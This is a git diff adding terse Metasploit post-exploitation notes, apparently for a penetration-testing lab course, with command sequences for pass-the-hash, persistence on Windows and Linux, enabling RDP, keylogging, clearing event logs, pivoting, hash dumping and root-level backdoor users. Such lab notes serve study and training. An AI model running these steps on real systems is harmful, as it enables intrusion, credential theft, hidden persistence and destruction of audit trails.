@@ -587,4 +587,176 @@ lsa_dump_secrets
 ```
 Can also upload mimikatz and use executable directly in shell instead of meterpreter kiwi commands.
 
+**Pass-the-hash with PsExec**
+PsExec module to authenticate via SMB using NTLM hashes.
+```
+pgrep lsass
+migrate ..
+getuid
+hashdump
+
+search psexec
+set payload ...
+set SMBUser Administrator
+set SMBPass 123:123
+```
+
+**Establishing persistence on Windows**
+```
+search platform:windows persistence_service
+set payload ...
+run and kill session
+
+use multi/handler
+set payload ...
+set LHOST eth1
+```
+
+**Enabling RDP**
+RDP uses TCP port 3389 by default. RDP is disabled by default. Requires authentication.
+```
+>after exploiting BadBlue
+background
+
+search enable_rdp
+db_nmap -p 3389 demo.ine.local
+sessions 1
+net users
+net user administrator hacker_123321
+
+xfreerdp /u:administrator /p:hacker123321 /v:demo.ine.local
+```
+
+**Windows keylogging**
+```
+keyscan_start
+keyscan_dump
+keyscan_stop
+```
+
+**Clearing Windows Event Logs**
+Event Viewer.
+```
+clearev
+```
+
+**Pivoting**
+Use compromised host to attack other systems on the compromised host's private internal network. Add network route with meterpreter.
+```
+set RHOSTS victim1
+
+ipconfig
+run autoroute -s victim1/20
+background
+sessions -n victim-1 -i 1
+search portscan tcp
+set RHOSTS victim2
+set PORTS 1-100
+
+sessions 1 
+portfwd add -l 1234 -p 80 -r victim2
+background
+db_nmap -sS -sV -p 1234 localhost
+search badblue
+set payload windows/meterpreter/bind_tcp
+set LPORT 4433
+set RHOSTS victim2
+```
+
+### Linux Post Exploitation
+**Linux Post Exploitation Modules**
+```
+search samba -> is_known_pipename
+sessions -u 1
+
+search enum_configs
+search env platform_linux -> post/multi/gather/env
+search enum_network
+loot
+search enum_protections
+notes
+search enum_system
+search checkcontainer
+search checkvm
+search enum_users_history
+```
+
+**Linux privilege escalation: exploiting a vulnerable program**
+```
+search ssh_login
+username and password provided in lab
+
+upgrade to meterpreter
+/bin/bash -i
+ps aux
+chkrootkit -V
+
+search chkrootkit
+set CHKROOTKIT /bin/chkrootkit
+set LHOST ?
+
+whoami
+```
+
+**Dumping hashes with Hashdump**
+```
+search is_known_pipeline
+sessions -u 1
+
+sysinfo
+getuid
+
+search hashdump
+>post/linux/gather/hashdump
+loot
+sessions 2
+shell
+/bin/bash -i
+passwd root
+useradd -m jan -s /bin/bash
+
+>hashdump run
+```
+Number between dollar signs show hashing algorithm. Lower number are weaker. Hashed passwords in /etc/shadow
+
+**Establishing persistence on Linux**
+```
+search ssh_login, password given
+
+search chkrootkit
+set CHKROOTKIT /bin/chkrootkit
+set LHOST ...
+sessions -u 3
+
+useradd -m ftp -s /bin/bash
+passwd ftp
+
+groups root
+usermod -aG root ftp
+groups ftp
+usermod -u 15 ftp
+
+search platform:linux persistence
+> cron_persistence
+set LPORT ...
+set LHOST ...
+failed...
+> service_persistence
+set payload cmd/unix/reverse_python
+set LHOST, LPORT ...
+failed...
+> sshkey_persistence
+set CREATESSHFOLDER true
+loot
+exit -y
+
+>copy over ssh_key
+chmod 0400 ssh_key
+ssh -i ssh_key root@ipaddress
+```
+
+### Armitage
+run armitage in metasploit, easy pesay.
+
+
 
